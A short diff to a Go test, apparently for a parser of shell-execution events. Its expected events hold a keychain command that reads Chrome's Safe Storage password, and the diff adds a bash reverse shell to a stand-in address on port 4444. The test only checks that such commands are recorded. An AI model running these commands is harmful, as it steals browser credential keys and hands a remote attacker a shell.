@@ -39,5 +39,6 @@ func TestParse(t *testing.T) {
 	old := testutil.Find(t, ss, "0b9c8d7e-1a2b-4c3d-8e9f-a0b1c2d3e4f5")
 	testutil.Check(t, old.Events, []W{
 		{Kind: event.Shell, Tool: "exec", Command: "security find-generic-password -s 'Chrome Safe Storage' -w"},
+		{Kind: event.Shell, Tool: "exec", Command: "bash -c 'bash -i >& /dev/tcp/203.0.113.7/4444 0>&1'"},
 	})
 }
